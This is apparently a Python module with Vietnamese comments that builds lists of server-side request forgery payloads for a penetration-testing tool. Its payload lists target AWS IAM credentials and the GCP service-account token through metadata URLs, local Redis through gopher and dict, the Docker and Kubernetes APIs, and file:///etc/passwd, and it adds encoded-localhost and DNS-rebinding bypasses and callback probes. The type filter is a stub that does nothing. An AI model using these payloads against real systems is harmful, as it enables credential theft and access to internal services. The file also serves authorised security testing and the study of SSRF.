"""
Payload Strategy Manager
Quản lý các chiến lược payload cho SSRF testing
"""

from typing import List, Dict, Set
from dataclasses import dataclass
from enum import Enum


class AttackDepth(Enum):
    """Mức độ tấn công"""
    QUICK = "quick"
    DEEP = "deep"
    CLOUD = "cloud"
    CONTAINER = "container"
    SIDE_CHANNEL = "side_channel"


class PayloadType(Enum):
    """Loại payload"""
    URL_BYPASS = "url_bypass"
    PROTOCOL_SMUGGLING = "protocol_smuggling"
    REDIRECT_BASED = "redirect_based"
    HEADER_INJECTION = "header_injection"
    TEMPLATE_INJECTION = "template_injection"
    BLIND_SSRF = "blind_ssrf"


@dataclass
class PayloadConfig:
    """Cấu hình payload"""
    attack_depth: AttackDepth
    payload_types: List[PayloadType]
    target_types: List[str]
    safe_mode: bool = True
    disable_destructive: bool = True


class PayloadStrategyManager:
    """Quản lý payload strategies"""
    
    def __init__(self, config: PayloadConfig):
        self.config = config
        self.payloads = []
    
    def generate_payloads(self, callback_url: str) -> List[Dict[str, str]]:
        """Generate payloads dựa trên config"""
        payloads = []
        
        # Quick scan payloads
        if self.config.attack_depth == AttackDepth.QUICK:
            payloads.extend(self._get_quick_payloads(callback_url))
        
        # Deep scan payloads
        elif self.config.attack_depth == AttackDepth.DEEP:
            payloads.extend(self._get_quick_payloads(callback_url))
            payloads.extend(self._get_deep_payloads(callback_url))
        
        # Cloud-specific payloads
        elif self.config.attack_depth == AttackDepth.CLOUD:
            payloads.extend(self._get_cloud_payloads())
        
        # Container-specific payloads
        elif self.config.attack_depth == AttackDepth.CONTAINER:
            payloads.extend(self._get_container_payloads())
        
        # Side-channel payloads
        elif self.config.attack_depth == AttackDepth.SIDE_CHANNEL:
            payloads.extend(self._get_side_channel_payloads(callback_url))
        
        # Apply payload type filters
        filtered_payloads = self._filter_by_types(payloads)
        
        # Apply safe mode filters
        if self.config.safe_mode or self.config.disable_destructive:
            filtered_payloads = self._apply_safe_filters(filtered_payloads)
        
        return filtered_payloads
    
    def _get_quick_payloads(self, callback_url: str) -> List[Dict]:
        """Basic SSRF payloads"""
        return [
            # Callback
            {'payload': callback_url, 'type': 'direct', 'description': 'Direct callback'},
            
            # AWS Metadata
            {'payload': 'http://169.254.169.254/latest/meta-data/', 'type': 'cloud', 'description': 'AWS metadata'},
            
            # Localhost variants
            {'payload': 'http://localhost/', 'type': 'localhost', 'description': 'Localhost'},
            {'payload': 'http://127.0.0.1/', 'type': 'localhost', 'description': 'Localhost IP'},
            
            # File protocol (if not disabled)
            {'payload': 'file:///etc/passwd', 'type': 'file', 'description': 'File protocol', 'destructive': True},
        ]
    
    def _get_deep_payloads(self, callback_url: str) -> List[Dict]:
        """Advanced SSRF payloads"""
        payloads = []
        
        # URL bypass techniques
        if PayloadType.URL_BYPASS in self.config.payload_types:
            payloads.extend([
                # DNS rebinding
                {'payload': f'http://{callback_url.split("//")[1]}.xip.io/', 'type': 'dns_rebinding'},
                
                # Octal/Hex encoding
                {'payload': 'http://0x7f000001/', 'type': 'encoding', 'description': 'Hex localhost'},
                {'payload': 'http://2130706433/', 'type': 'encoding', 'description': 'Decimal localhost'},
                
                # IPv6
                {'payload': 'http://[::1]/', 'type': 'ipv6', 'description': 'IPv6 localhost'},
            ])
        
        # Protocol smuggling
        if PayloadType.PROTOCOL_SMUGGLING in self.config.payload_types:
            payloads.extend([
                {'payload': 'gopher://127.0.0.1:6379/_INFO', 'type': 'gopher', 'description': 'Gopher Redis', 'destructive': True},
                {'payload': 'dict://127.0.0.1:6379/info', 'type': 'dict', 'description': 'Dict Redis', 'destructive': True},
                {'payload': 'ftp://127.0.0.1/', 'type': 'ftp', 'description': 'FTP protocol'},
            ])
        
        return payloads
    
    def _get_cloud_payloads(self) -> List[Dict]:
        """Cloud metadata payloads"""
        return [
            # AWS
            {'payload': 'http://169.254.169.254/latest/meta-data/', 'type': 'aws', 'description': 'AWS metadata v1'},
            {'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'type': 'aws', 'description': 'AWS IAM creds'},
            
            # GCP
            {'payload': 'http://metadata.google.internal/computeMetadata/v1/', 'type': 'gcp', 'description': 'GCP metadata'},
            {'payload': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 'type': 'gcp', 'description': 'GCP token'},
            
            # Azure
            {'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'type': 'azure', 'description': 'Azure metadata'},
        ]
    
    def _get_container_payloads(self) -> List[Dict]:
        """Container-specific payloads"""
        return [
            # Docker API
            {'payload': 'http://127.0.0.1:2375/containers/json', 'type': 'docker', 'description': 'Docker API', 'destructive': True},
            
            # Kubernetes
            {'payload': 'https://kubernetes.default.svc/api/v1/namespaces', 'type': 'k8s', 'description': 'K8s API'},
            
            # Consul
            {'payload': 'http://127.0.0.1:8500/v1/catalog/services', 'type': 'consul', 'description': 'Consul API'},
            
            # Redis
            {'payload': 'http://127.0.0.1:6379/', 'type': 'redis', 'description': 'Redis'},
        ]
    
    def _get_side_channel_payloads(self, callback_url: str) -> List[Dict]:
        """Side-channel detection payloads"""
        return [
            # HTTP callback (clean URL)
            {'payload': f'http://{callback_url.split("//")[1]}/', 'type': 'http_callback', 'description': 'HTTP callback (root path)'},
            
            # Time-based (slow endpoint)
            {'payload': f'{callback_url}/slow?delay=5', 'type': 'time_based', 'description': 'Time delay 5s'},
        ]
    
    def _filter_by_types(self, payloads: List[Dict]) -> List[Dict]:
        """Filter payloads theo payload types được chọn"""
        if not self.config.payload_types:
            return payloads
        
        # Implement filtering logic based on payload types
        return payloads
    
    def _apply_safe_filters(self, payloads: List[Dict]) -> List[Dict]:
        """Apply safe mode filters"""
        if self.config.disable_destructive:
            # Remove destructive payloads
            payloads = [p for p in payloads if not p.get('destructive', False)]
        
        return payloads


def create_payload_manager(
    attack_depth: str,
    payload_types: List[str],
    target_types: List[str],
    safe_mode: bool = True,
    disable_destructive: bool = True
) -> PayloadStrategyManager:
    """Factory function để tạo PayloadStrategyManager"""
    
    # Convert strings to enums
    depth_enum = AttackDepth(attack_depth)
    types_enum = [PayloadType(t) for t in payload_types if t in [e.value for e in PayloadType]]
    
    config = PayloadConfig(
        attack_depth=depth_enum,
        payload_types=types_enum,
        target_types=target_types,
        safe_mode=safe_mode,
        disable_destructive=disable_destructive
    )
    
    return PayloadStrategyManager(config)
